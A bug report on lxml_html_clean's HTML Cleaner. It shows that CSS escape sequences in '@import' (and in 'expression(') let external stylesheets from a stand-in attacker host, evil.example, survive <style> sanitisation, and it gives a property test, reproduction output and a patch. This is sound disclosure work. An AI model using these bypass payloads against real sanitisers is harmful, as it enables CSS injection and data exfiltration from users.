# Bug Report: lxml_html_clean.clean CSS-escaped `@import` bypasses `<style>` sanitisation

**Target**: `lxml_html_clean.clean` (`Cleaner.__call__` / `Cleaner._has_sneaky_javascript`)
**Severity**: High
**Bug Type**: Logic (security)
**Date**: 2026-10-06

## Summary

With the default `Cleaner` (`javascript=True`, `style=False`), `<style>` blocks are meant to have every `@import` removed ("The imported CSS can do anything; we just can't allow" it). If the at-rule name uses CSS escape sequences (`@\69mport`, `@impor\74 `, `@\000069mport`), the rule gets through unchanged. Browsers decode those escapes per CSS Syntax Level 3, so they still load the attacker's external stylesheet.

## Property-Based Test

```python
import re
from hypothesis import given, settings, strategies as st
from lxml import html as lhtml
from lxml_html_clean import clean_html

def css_escape(ch, style):
    h = format(ord(ch), 'x')
    if style == 0: return ch
    if style == 1: return '\\' + h + ' '
    if style == 2: return '\\' + h.rjust(6, '0')
    return '\\' + ch

@st.composite
def obfuscated_import(draw):
    parts = [css_escape(c, draw(st.integers(0, 3))) for c in 'import']
    return '@' + ''.join(parts) + " url('http://evil.example/x.css');"

def css_unescape(s):
    s = re.sub(r'\\([0-9a-fA-F]{1,6}) ?', lambda m: chr(int(m.group(1), 16)), s)
    return re.sub(r'\\(.)', r'\1', s)

@settings(max_examples=500)
@given(obfuscated_import(), st.sampled_from(['', 'p{color:red}', 'b{}']))
def test_no_import_in_style_tag(imp, other):
    out = clean_html(f'<div><style>{other}{imp}</style><p>x</p></div>')
    for st_el in lhtml.fromstring(out).iter('style'):
        assert '@import' not in css_unescape(st_el.text or '').lower(), out
```

**Failing input**: `imp="@impor\\74  url('http://evil.example/x.css');", other=''`

## Reproducing the Bug

```python
from lxml_html_clean import clean_html

print(clean_html('<div><style>@import url(http://evil.example/x.css);</style></div>'))
print(clean_html('<div><style>@impor\\74  url(http://evil.example/x.css);</style></div>'))
print(clean_html('<div><style>@\\69mport url(http://evil.example/x.css);</style></div>'))
```

Output:
```
<div><style> url(http://evil.example/x.css);</style></div>
<div><style>@impor\74  url(http://evil.example/x.css);</style></div>
<div><style>@\69mport url(http://evil.example/x.css);</style></div>
```

## Why This Is A Bug

`Cleaner` removes `@import` from `<style>` content because an imported stylesheet is arbitrary attacker-controlled CSS. Its `_has_sneaky_javascript` docstring also says it handles obfuscation. Neither check decodes CSS escapes:

- `_replace_css_import` matches only the literal `@\s*import`.
- `_has_sneaky_javascript` only strips backslashes, so `@\69mport` becomes `@69mport` and `@impor\74 ` becomes `@impor74`. Neither matches `@import`.

Under CSS Syntax Level 3, `\69` and `\74` are valid escapes inside an at-keyword. Browsers therefore read the at-rule as `@import` and fetch the external stylesheet. That allows CSS injection or data exfiltration (for example attribute-selector exfiltration, or UI redressing) in content the application thinks is sanitised. The same weakness affects the `expression(` and `javascript:` checks in `<style>` content (for example `e\78pression(`).

## Fix

Decode CSS escapes before running the "sneaky" checks:

```diff
--- a/lxml_html_clean/clean.py
+++ b/lxml_html_clean/clean.py
@@
+_css_hex_escape = re.compile(r'\\([0-9a-fA-F]{1,6})[ \t\n\r\f]?')
+
+def _decode_css_escapes(style):
+    def repl(m):
+        cp = int(m.group(1), 16)
+        return chr(cp) if 0 < cp <= 0x10FFFF else '�'
+    style = _css_hex_escape.sub(repl, style)
+    return re.sub(r'\\(.)', r'\1', style, flags=re.S)
+
@@ def _has_sneaky_javascript(self, style):
         style = self._substitute_comments('', style)
-        style = style.replace('\\', '')
+        style = _decode_css_escapes(style)
+        style = style.replace('\\', '')
         style = _substitute_whitespace('', style)
         style = style.lower()
```

With this patch, any `<style>` whose decoded content contains `@import` is replaced with `/* deleted */`.
